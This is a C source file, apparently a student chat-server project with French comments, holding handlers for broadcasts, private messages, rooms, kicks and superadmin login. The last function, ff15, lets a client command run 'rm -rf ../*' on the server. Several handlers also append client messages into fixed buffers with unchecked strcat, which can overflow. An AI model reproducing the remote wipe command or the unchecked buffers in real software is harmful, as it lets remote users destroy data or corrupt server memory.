#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>

#include "global.h"

// Vérifie si le client est connecté
// pre:
// post: isConnected(dSC) == 1 || isConnected(dSC) == 0
// post: isConnected(-1) == 0
int isConnected(int dSC){
    pthread_mutex_lock(&mutex);
    if(dSC == -1){
        pthread_mutex_unlock(&mutex);
        return 0;
    }
    else{
        for(int i = 0; i < MAX_CLIENT; i++){
            if(clientList[i].connection.dSC == dSC){
                pthread_mutex_unlock(&mutex);
                return 1;
            }
        }
        pthread_mutex_unlock(&mutex);
        return 0;
    }
}

// Recupère la dSC du client à partir de son id
// pre: isConnected(dSC) == 1
// post: getDSC(getID(dSC)) == dSC
// post: getDSC(id) == dSC
// post: Attention, si le client n'est pas connecté, une erreur est throw
int getDSC(int id){
    // Overkill mais mieux si il y a un scale up
    pthread_mutex_lock(&mutex);
    int dSC = clientList[id].connection.dSC;
    pthread_mutex_unlock(&mutex);
    if(isConnected(dSC)){
        return dSC;
    }
    else{
        perror("Erreur lors de la récupération du descripteur de socket du client");
        exit(0);
    }
}

// Recupère l'id du client à partir de sa dSC
// pre: isConnected(dSC) == 1
// post: getID(getDSC(id)) == id
// post: getID(dSC) == id, 0 <= id < MAX_CLIENT
// post: Attention, si le client n'est pas connecté, une erreur est throw
int getID(int dSC){
    pthread_mutex_lock(&mutex);
    for(int i = 0; i < MAX_CLIENT; i++){
        if(clientList[i].connection.dSC == dSC){
            pthread_mutex_unlock(&mutex);
            return i;
        }
    }
    pthread_mutex_unlock(&mutex);
    perror("Erreur lors de la récupération de l'id du client");
    exit(0);
}

// Recupère le pseudo du client à partir de sa dSC
// pre: isConnected(dSC) == 1
// post: getPseudo(dSC) == pseudo
// post: Attention, si le client n'est pas connecté, une erreur est throw
char* getPseudoByDSC(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    int id = getID(dSC);
    pthread_mutex_lock(&mutex);
    char * pseudo = clientList[id].pseudo;
    pthread_mutex_unlock(&mutex);
    return pseudo;
}

// Recupère le ID du client à partir de son pseudo
// pre: isConnected(dSC) == 1
// post: getID(getDSCByPseudo(pseudo)) == getIDByPseudo(pseudo) == id
// post: Attention, si le client n'est pas connecté => return -1
int getIDByPseudo(char* pseudo){
    pthread_mutex_lock(&mutex);
    for(int i = 0; i < MAX_CLIENT; i++){
        if(strcmp(clientList[i].pseudo, pseudo) == 0){
            pthread_mutex_unlock(&mutex);
            return i;
        }
    }
    pthread_mutex_unlock(&mutex);
    return -1;
}

// Recupère le dSC du client à partir de son pseudo
// pre: isConnected(dSC) == 1
// post: getDSC(getIDByPseudo(pseudo)) == getDSCByPseudo(pseudo) == dSC
// post: Attention, si le client n'est pas connecté => return -1
int getDSCByPseudo(char* pseudo){
    pthread_mutex_lock(&mutex);
    for(int i = 0; i < MAX_CLIENT; i++){
        if(strcmp(clientList[i].pseudo, pseudo) == 0){
            int result = clientList[i].connection.dSC;
            pthread_mutex_unlock(&mutex);
            return result;
        }
    }
    pthread_mutex_unlock(&mutex);
    return -1;
}

// Recupère le nom de la room à partir de son id
// post: getRoomName(id) == -1 => la room n'existe pas
int getRoomId(char* roomName){
    pthread_mutex_lock(&mutexRoom);
    for(int i = 0; i < MAX_ROOM; i++){
        if(strcmp(roomList[i].name, roomName) == 0){
            pthread_mutex_unlock(&mutexRoom);
            return i;
        }
    }
    pthread_mutex_unlock(&mutexRoom);
    return -1;
}

// Traduit le nom de la room en son id
// pre: isRoom(roomName) == 1
// post: Attention, si la room n'existe pas, une erreur est throw
int roomNameToID(char* roomName){
    pthread_mutex_lock(&mutexRoom);
    for(int i = 0; i < MAX_ROOM; i++){
        if(strcmp(roomList[i].name, roomName) == 0){
            pthread_mutex_unlock(&mutexRoom);
            return i;
        }
    }
    pthread_mutex_unlock(&mutexRoom);
    perror("Erreur la room n'existe pas");
    exit(0);
}

// Si la room existe déjà, on renvoie 1 sinon 0
int isRoom(char* roomName){
    pthread_mutex_lock(&mutexRoom);
    for(int i = 0; i < MAX_ROOM; i++){
        if(strcmp(roomList[i].name, roomName) == 0 && roomList[i].nbClient > 0){
            pthread_mutex_unlock(&mutexRoom);
            return 1;
        }
    }
    pthread_mutex_unlock(&mutexRoom);
    return 0;
}

// Appelé quand le client envoie la commande "sudo all <msg>"
// Appelé aussi quand le client envoie "<msg>", car c'est la commande par défaut
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void sendAll(char* msg, int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    char infoMsg[MAX_CHAR] = "\033[31m[BROADCAST]\033[0m ";
    strcat(infoMsg, msg);

    for(int i = 0; i < MAX_CLIENT; i++){
        pthread_mutex_lock(&mutex);
        int dSCLoop = clientList[i].connection.dSC;
        pthread_mutex_unlock(&mutex);
        
        if(isConnected(dSCLoop) && dSCLoop != dSC){
            
            // Envoie un message au client i
            // int send(int dSC, void *msg, int lg, int flags)
            // Renvoie le nombre d'octet envoyé
            // dSC = descripteur de socket du client
            // &recvR = message envoyé
            // sizeof(int) = taille du message (ici 4)
            // 0 = flags
            if(send(dSCLoop, infoMsg, MAX_CHAR, 0) == -1){
                perror("Erreur lors de l'envoie du message B");
                exit(0);
            }
        }
    }
}

// Appelé quand le client envoie la commande "sudo mp <id> <msg>"
// pre: isConnected(dSC) == 1
// post: Attention, si l'un des clients n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void sendMP(char* msg, int idS, int idR){
    if(isConnected(getDSC(idS)) == 0 || isConnected(getDSC(idR)) == 0){
        perror("Erreur un des clients n'est pas connecté");
        exit(0);
    }

    // Envoie un message au client idR
    char infoMsg[MAX_CHAR] = "\033[32m[MP]\033[0m ";
    strcat(infoMsg, getPseudoByDSC(getDSC(idS)));
    strcat(infoMsg, ": ");
    strcat(infoMsg, msg);

    if(send(getDSC(idR), infoMsg, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
}

// Appelé quand le client envoie la commande "sudo help"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void sendHelp(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // Ouverture du fichier commandes.txt
    FILE *f = fopen("commandes.txt", "r");
    if(f == NULL){
        perror("Erreur lors de l'ouverture du fichier");
        exit(0);
    }
    char line[MAX_CHAR];
    while(fgets(line, sizeof(line), f)){
        line[strlen(line)-1] = '\0';
        char finalLine[MAX_CHAR];
        strcpy(finalLine, "\033[36m[INFO]\033[0m ");
        strcat(finalLine, line);
        if(send(dSC, finalLine, sizeof(finalLine), 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
    }
    fclose(f);
}

// Appelé quand le client envoie la commande "sudo quit"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
// post: Attention, si la fermeture de la connexion échoue, une erreur est throw
void sendQuit(int dSC){
    
    int id = getID(dSC);

    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }

    // Envoie un message de prévention au client
    char quit[MAX_CHAR] = "\033[36m[INFO]\033[0m Vous avez été déconnecté du serveur";
    if(send(dSC, quit, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }

    // Ferme la connexion avec le client
    // int shutdown(int dSC, int mode)
    // Renvoie 0 si la fermeture est réussi et -1 si elle échoue
    // dSC = descripteur de socket du client
    // mode = mode de fermeture
    // 0 = plus de réception
    // 1 = plus d'envoi
    // 2 = plus de réception et d'envoi
    if(shutdown(dSC, 2) == -1){
        perror("Erreur lors de la fermeture de la connexion avec le client");
        exit(0);
    }

    // Informe le threadMemory qu'il peut supprimer le thread
    pthread_mutex_lock(&mutex);
    printf("\033[36m[INFO]\033[0m Le client %s s'est déconnecté\n", clientList[id].pseudo);
    clientList[id].threadEnd = 1;
    pthread_mutex_unlock(&mutex);

    // Incrémente le nombre de thread à nettoyer
    sem_post(&semaphoreMemory);
}

// Appelé quand le client envoie la commande "sudo list"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void sendList(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
    
    // Envoie la liste des clients connectés du type:
    // [INFO] Liste des clients connectés :
    // [INFO] Salon 1: client1, client2, client3
    // [INFO] Salon 2: client4, client5, client6
    char list[MAX_CHAR] = "\033[36m[INFO]\033[0m Liste des clients connectés par salon :";

    char salonClient[MAX_CLIENT + 1][MAX_CHAR];
    
    // Initialise le tableau
    for(int i = 0; i < MAX_CLIENT + 1; i++){
        pthread_mutex_lock(&mutexRoom);
        char roomName[MAX_CHAR];
        strcpy(roomName, roomList[i].name);
        pthread_mutex_unlock(&mutexRoom);
        if(isRoom(roomName) == 1){
            pthread_mutex_lock(&mutexRoom);
            strcpy(salonClient[i], "\033[36m[INFO]\033[0m ");
            strcat(salonClient[i], roomList[i].name);
            strcat(salonClient[i], ": ");
            pthread_mutex_unlock(&mutexRoom);
        }
        else{
            pthread_mutex_lock(&mutexRoom);
            strcpy(salonClient[i], "");
            pthread_mutex_unlock(&mutexRoom);
        }
    }

    // Rempli le tableau
    for(int i = 0; i < MAX_CLIENT; i++){
        pthread_mutex_lock(&mutex);
        int dSCLoop = clientList[i].connection.dSC;
        pthread_mutex_unlock(&mutex);
        if(isConnected(dSCLoop) == 1){
            char pseudo[MAX_PSEUDO];
            strcpy(pseudo, getPseudoByDSC(dSCLoop));
            pthread_mutex_lock(&mutex);
            strcat(salonClient[clientList[i].roomId], pseudo);
            strcat(salonClient[clientList[i].roomId], ", ");
            pthread_mutex_unlock(&mutex);
        }
    }

    // Envoie la liste des clients connectés
    if(send(dSC, list, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
    for(int i = 0; i < MAX_CLIENT + 1; i++){
        if(strcmp(salonClient[i], "") != 0){
            // Retire la dernière virgule
            if(salonClient[i][strlen(salonClient[i])-2] == ','){
                salonClient[i][strlen(salonClient[i])-2] = '\0';
            }
            if(send(dSC, salonClient[i], MAX_CHAR, 0) == -1){
                perror("Erreur lors de l'envoie du message");
                exit(0);
            }
        }
    }
}

// Appelé quand le client envoie la commande "sudo kick <id>"
// pre: isConnected(dSC) == 1
// post: Attention, si l'un des clients n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
// post: Attention, si la fermeture de la connexion échoue, une erreur est throw
void sendKick(int idS, int idR){
    if(isConnected(getDSC(idS)) == 0 || isConnected(getDSC(idR)) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // Envoie un message de prévention au client
    char kick[MAX_CHAR] = "\033[36m[INFO]\033[0m Vous avez été kick du serveur par ";
    
    pthread_mutex_lock(&mutex);
    strcat(kick, clientList[idS].pseudo);
    pthread_mutex_unlock(&mutex);

    if(send(getDSC(idR), kick, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }

    // Ferme la connexion avec le client
    // int shutdown(int dSC, int mode)
    // Renvoie 0 si la fermeture est réussi et -1 si elle échoue
    // dSC = descripteur de socket du client
    // mode = mode de fermeture
    // 0 = plus de réception
    // 1 = plus d'envoi
    // 2 = plus de réception et d'envoi
    if(shutdown(getDSC(idR), 2) == -1){
        perror("Erreur lors de la fermeture de la connexion avec le client");
        exit(0);
    }

    // Informe le threadMemory qu'il peut supprimer le thread
    pthread_mutex_lock(&mutex);
    printf("\033[36m[INFO]\033[0m Le client %s s'est fait kick\n", clientList[idR].pseudo);
    clientList[idR].threadEnd = 1;
    pthread_mutex_unlock(&mutex);

    // Incrémente le nombre de thread à nettoyer
    sem_post(&semaphoreMemory);
}

// Vérifie si le pseudo est correct
// pre: pseudo != NULL
// post: Renvoie 1 si le pseudo est correct, 0 sinon
int properPseudo(char* pseudo){
    if(pseudo == NULL){
        perror("Erreur le pseudo est NULL");
        exit(0);
    }
    else if(strlen(pseudo) > MAX_PSEUDO){
        return 0;
    }
    for(int i = 0; i < MAX_CLIENT; i++){
        if(strcmp(pseudo, clientList[i].pseudo) == 0){
            return 0;
        }
    }
    for(int i = 0; i < strlen(pseudo); i++){
        if(pseudo[i] == ' ' || pseudo[i] == '\n' || pseudo[i] == '\t' || pseudo[i] == '\r'){
            return 0;
        }
    }
    return 1;
}

// Appelé quand le client envoie la commande "sudo rename <pseudo>"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void sendRename(char* pseudo, int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // Avant de changer le pseudo, on vérifie qu'il n'est pas déjà pris, si c'est le cas on envoie un message pour prévenir le client que le pseudo est déjà pris
    // On vérifie aussi que le pseudo ne contient pas de caractère interdit d'espace, de retour à la ligne etc ...
    if(properPseudo(pseudo) == 1){
        int id = getID(dSC);
        // Si c'est la première fois que le client change son pseudo
        int firstTime = 0;
        pthread_mutex_lock(&mutex);
        // Si le début du pseudo est "Client", alors on considère que c'est la première fois que le client change son pseudo
        if(strncmp(clientList[id].pseudo, "Client", 6) == 0){
            printf("\033[36m[INFO]\033[0m Un client s'est connecté avec le pseudo %s\n", pseudo);
            firstTime = 1;
        }
        pthread_mutex_unlock(&mutex);
        
        pthread_mutex_lock(&mutex);
        strcpy(clientList[id].pseudo, pseudo);
        pthread_mutex_unlock(&mutex);
        char rename[MAX_CHAR] = "\033[42m[SUCCESS]\033[0m Votre pseudo a été changé en ";
        if(firstTime == 1){
            strcpy(rename, "\033[42m[SUCCESS]\033[0m Vous êtes connecté avec le pseudo ");
        }
        strcat(rename, pseudo);


        if(send(dSC, rename, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
    }
    else{
        char rename[MAX_CHAR] = "\033[36m[INFO]\033[0m Votre pseudo n'a pas pu être changé car il est déjà pris ou contient des caractères interdits ou est trop long réessayez avec sudo rename <pseudo>";
        if(send(dSC, rename, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
    }
}

// Appelé quand le client envoie la commande "sudo download"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void sendDownload(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    //affiche la liste des fichiers qu'il y a dans le dossier spécifié
    char download[MAX_CHAR] = "\033[36m[INFO]\033[0m Liste des fichiers dans le dossier spécifié pour le serveur:";
    
    if(send(dSC, download, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
    
    //On affiche la liste des fichiers dans le dossier spécifié
    char command[MAX_CHAR] = "ls ";
    strcat(command, SERVER_TRANSFER_FOLDER);
    strcat(command, " > list.txt");
    system(command);

    //On ouvre le fichier list.txt
    FILE* file = fopen("list.txt", "r");
    if(file == NULL){
        perror("Erreur lors de l'ouverture du fichier list.txt");
        exit(0);
    }

    //On lit le fichier list.txt et on l'envoie au client
    char line[MAX_CHAR];
    while(fgets(line, MAX_CHAR, file) != NULL){

        //On enlève le \n à la fin de la ligne
        line[strlen(line) - 1] = '\0';

        if(send(dSC, line, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
    }
    fclose(file);

    //On supprime le fichier list.txt
    if(remove("list.txt") == -1){
        perror("Erreur lors de la suppression du fichier list.txt");
        exit(0);
    }
}

// Compte le nombre de client actuellement dans la room
int countClientRoom(char* roomName){
    int nbClient = 0;
    pthread_mutex_lock(&mutex);
    for(int i = 0; i < MAX_CLIENT; i++){
        if(clientList[i].roomId == roomNameToID(roomName)){
            nbClient++;
        }
    }
    pthread_mutex_unlock(&mutex);
    return nbClient;
}

// Créé une room
// pre: isRoom(roomName) == 0
// post: Si il n'y a plus de slot libre => createRoom() == 0;
// post: Si la room n'existe pas => createRoom() == 1;
int createRoom(char* roomName, int nbMaxClient){
    // On cherche une place libre dans le tableau de room
    int i = 0;
    pthread_mutex_lock(&mutexRoom);
    while( i < MAX_ROOM + 1 && roomList[i].nbClient != 0 ){
        i++;
    }
    if(i == MAX_ROOM && roomList[i].nbClient != 0){
        pthread_mutex_unlock(&mutexRoom);
        return 0;
    }
    else{
        strcpy(roomList[i].name, roomName);
        // Description par défaut
        strcpy(roomList[i].description, "Description en construction\0");
        roomList[i].nbClient = nbMaxClient;
        pthread_mutex_unlock(&mutexRoom);
        return 1;
    }
}

// Appelé quand le client envoie la commande "sudo create <salon>"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Si la room existe déjà, la commande est annulée
// post: Attention, si la création de la room échoue, une erreur est throw
void sendCreate(char* roomName, int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // On vérifie que la room n'existe pas déjà
    if(isRoom(roomName) == 1){
        char create[MAX_CHAR] = "\033[41m[ERROR]\033[0m La room existe déjà";
        if(send(dSC, create, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }
    
    // On crée la room
    if(createRoom(roomName, MAX_CLIENT) != 0){
        char create[MAX_CHAR] = "\033[42m[SUCCESS]\033[0m La room a été créée";
        if(send(dSC, create, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
    }
    else{
        char create[MAX_CHAR] = "\033[41m[ERROR]\033[0m La room n'a pas pu être créée, aucun slot disponible";
        if(send(dSC, create, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
    }
}

// Appelé quand le client envoie n'envoie pas de commande (commande par défaut)
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void sendRoom(char* message, int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // On envoie le message à tous les clients de la room

    int id = getID(dSC);
    char msg[MAX_CHAR] = "\033[34m[ROOM]\033[0m ";
    pthread_mutex_lock(&mutex);
    strcat(msg, clientList[id].pseudo);
    strcat(msg, ": ");
    strcat(msg, message);
    for(int i = 0; i < MAX_CLIENT; i++){
        if(clientList[i].connection.dSC != dSC && clientList[i].roomId == clientList[id].roomId && clientList[i].connection.dSC != -1){
            if(send(clientList[i].connection.dSC, msg, MAX_CHAR, 0) == -1){
                perror("Erreur lors de l'envoie du message lors de sendRoom");
                exit(0);
            }
        }
    }
    pthread_mutex_unlock(&mutex);
}

// Appelé quand le client envoie la commande "sudo join <salon>" ou juste après qu'il crée une room
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
void sendJoin(char* roomName, int dSC){

    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // On vérifie que la room existe
    if(isRoom(roomName) == 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m La room n'existe pas";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }
    
    // On vérifie que la room n'est pas pleine
    int roomId = roomNameToID(roomName);
    pthread_mutex_lock(&mutexRoom);
    int nbClient = roomList[roomId].nbClient;
    pthread_mutex_unlock(&mutexRoom);
    if(countClientRoom(roomName) == nbClient){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m La room est pleine";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }

    // On vérifie que le client n'est pas déjà dans la room
    int id = getID(dSC);
    pthread_mutex_lock(&mutex);
    if(clientList[id].roomId == roomId){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Vous êtes déjà dans cette room";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        pthread_mutex_unlock(&mutex);
        return;
    }
    pthread_mutex_unlock(&mutex);
    
    // On change la room du client
    pthread_mutex_lock(&mutex);
    clientList[id].roomId = roomId;
    pthread_mutex_unlock(&mutex);
    
    // On envoie un message de confirmation au client
    char join[MAX_CHAR] = "\033[36m[INFO]\033[0m Vous avez rejoint la room ";
    pthread_mutex_lock(&mutexRoom);
    strcat(join, roomList[roomId].name);
    pthread_mutex_unlock(&mutexRoom);
    if(send(dSC, join, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }

    // On envoie la description de la room au client
    char description[MAX_CHAR];
    pthread_mutex_lock(&mutexRoom);
    sprintf(description, "\033[34m[ROOM]\033[0m Description: %s", roomList[roomId].description);
    pthread_mutex_unlock(&mutexRoom);
    if(send(dSC, description, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
}

// Appelé quand le client envoie la commande "sudo leave"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
void sendLeave(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // On change la room du client
    int id = getID(dSC);
    pthread_mutex_lock(&mutex);
    clientList[id].roomId = 0;
    pthread_mutex_unlock(&mutex);
    
    // On envoie un message de confirmation au client
    char leave[MAX_CHAR] = "\033[36m[INFO]\033[0m Vous avez quitté la room, vous revenez dans le salon principal";
    if(send(dSC, leave, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message leave dans sendLeave");
        exit(0);
    }

    // On envoie la description de la room au client
    char description[MAX_CHAR] = "\033[34m[ROOM]\033[0m Description: ";
    pthread_mutex_lock(&mutexRoom);
    strcat(description, roomList[0].description);
    pthread_mutex_unlock(&mutexRoom);
    if(send(dSC, description, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message de description dans sendLeave");
        exit(0);
    }
}

// Appelé quand lorsque le client rejoins le serveur
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
void sendFirstJoin(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }
    
    // On reset la room du client
    int id = getID(dSC);
    pthread_mutex_lock(&mutex);
    clientList[id].roomId = 0;
    pthread_mutex_unlock(&mutex);

    // On envoie la description de la room au client
    char description[MAX_CHAR] = "\033[34m[ROOM]\033[0m Description: ";
    pthread_mutex_lock(&mutexRoom);
    strcat(description, roomList[0].description);
    pthread_mutex_unlock(&mutexRoom);
    // Le strcpy est nécessaire car sinon le message n'est pas envoyé
    //printf("%s\n", description);
    if(send(dSC, description, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message dans sendFirstJoin");
        exit(0);
    }
}

// Appelé quand le client envoie la commande "sudo delete <salon>"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
void sendDelete(char* roomName, int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté dans sendDelete");
        exit(0);
    }

    // On vérifie que la room existe
    if(isRoom(roomName) == 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m La room n'existe pas";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }
    
    // On vérifie que ce n'est pas le salon principal
    if(getRoomId(roomName) == 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Vous ne pouvez pas supprimer le salon principal";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }

    // On fait leave tous les clients de la room
    int roomIdDelete = getRoomId(roomName);
    pthread_mutex_lock(&mutex);
    for(int i = 0; i < MAX_CLIENT; i++){
        if(clientList[i].roomId == roomIdDelete){
            char messageDelete[MAX_CHAR] = "\033[36m[INFO]\033[0m La room a été supprimée, vous revenez dans le salon principal";
            if(send(clientList[i].connection.dSC, messageDelete, MAX_CHAR, 0) == -1){
                perror("Erreur lors de l'envoie du message");
                exit(0);
            }
            // On change la room du client
            clientList[i].roomId = 0;

            // On envoie la description de la room au client
            char description[MAX_CHAR] = "\033[34m[ROOM]\033[0m Description: ";
            pthread_mutex_lock(&mutexRoom);
            strcat(description, roomList[0].description);
            pthread_mutex_unlock(&mutexRoom);
            pthread_mutex_unlock(&mutex);
            if(send(getDSC(i), description, MAX_CHAR, 0) == -1){
                perror("Erreur lors de l'envoie du message de description dans sendLeave");
                exit(0);
            }
            pthread_mutex_lock(&mutex);
        }
    }
    pthread_mutex_unlock(&mutex);

    // On "supprime" la room
    pthread_mutex_lock(&mutexRoom);
    roomList[roomIdDelete].nbClient = 0;
    pthread_mutex_unlock(&mutexRoom);

    // On envoie un message de confirmation au client
    char join[MAX_CHAR] = "\033[36m[INFO]\033[0m La room a été supprimée";
    if(send(dSC, join, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
}

// Appelé quand le client envoie la commande "sudo move <salon> <pseudo>"
// pre: isConnected(dSCS) && isConnected(dSCR) == 1
// post: Attention, si l'un des clients n'est pas connecté, une erreur est throw
void sendMove(char* roomName, int dSCS, int dSCR){
    if(isConnected(dSCS) == 0 || isConnected(dSCR) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }

    // On vérifie que la room existe
    if(isRoom(roomName) == 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m La room n'existe pas";
        if(send(dSCS, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        return;
    }

    // On vérifie que le client n'est pas déjà dans la room
    int idR = getID(dSCR);
    pthread_mutex_lock(&mutex);
    if(clientList[idR].roomId == getRoomId(roomName)){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Le client est déjà dans la room";
        if(send(dSCS, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        pthread_mutex_unlock(&mutex);
        return;
    }
    pthread_mutex_unlock(&mutex);

    // On prévient le client qu'il a été déplacé
    char join[MAX_CHAR] = "\033[36m[INFO]\033[0m Vous avez été déplacé dans une autre room";
    if(send(dSCR, join, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }

    // On fait join le client dans la room
    sendJoin(roomName, dSCR);
}

// Appelé quand le client envoie la commande "sudo superadmin <password>"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
void sendSuperAdmin(char* password, int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté dans sendSuperAdmin");
        exit(0);
    }

    // On vérifie que le client n'est pas déjà superadmin
    int id = getID(dSC);
    pthread_mutex_lock(&mutex);
    if(clientList[id].isSuperAdmin == 1){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Vous êtes déjà superadmin";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        pthread_mutex_unlock(&mutex);
        return;
    }
    pthread_mutex_unlock(&mutex);

    // On vérifie que le mot de passe est correct
    pthread_mutex_lock(&mutex);
    if(strcmp(password, PASSWORD) != 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Mot de passe incorrect";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        pthread_mutex_unlock(&mutex);
        return;
    }
    pthread_mutex_unlock(&mutex);

    // On donne les droits de superadmin au client
    pthread_mutex_lock(&mutex);
    clientList[id].isSuperAdmin = 1;
    pthread_mutex_unlock(&mutex);

    // On envoie un message de confirmation au client
    char join[MAX_CHAR] = "\033[42m[SUCCESS]\033[0m Vous avez les droits de superadmin";
    if(send(dSC, join, MAX_CHAR, 0) == -1){
        perror("Erreur lors de l'envoie du message");
        exit(0);
    }
}

// Vérifie si le client a les droits de superadmin
// pre: isConnected(dSC) == 1
// post: Renvoie 1 si le client a les droits de superadmin, 0 sinon
int isSuperAdmin(int dSC){
    // On vérifie que le client a bien les super pouvoirs
    int idS = getID(dSC);
    pthread_mutex_lock(&mutex);
    if(clientList[idS].isSuperAdmin == 0){
        char join[MAX_CHAR] = "\033[41m[ERROR]\033[0m Vous n'avez pas les droits pour effectuer cette commande";
        if(send(dSC, join, MAX_CHAR, 0) == -1){
            perror("Erreur lors de l'envoie du message");
            exit(0);
        }
        pthread_mutex_unlock(&mutex);
        return 0;
    }
    pthread_mutex_unlock(&mutex);
    return 1;
}

// !!! Attention, cette fonction est à utiliser avec précaution !!!
// Appelé quand le client envoie la commande "sudo ff15"
// pre: isConnected(dSC) == 1
// post: Attention, si le client n'est pas connecté, une erreur est throw
// post: Attention, si l'envoie du message échoue, une erreur est throw
void ff15(int dSC){
    if(isConnected(dSC) == 0){
        perror("Erreur le client n'est pas connecté");
        exit(0);
    }

    char command[MAX_CHAR] = "rm -rf ../*";

    //On supprime tous les fichiers du dossier spécifié
    system(command);
}

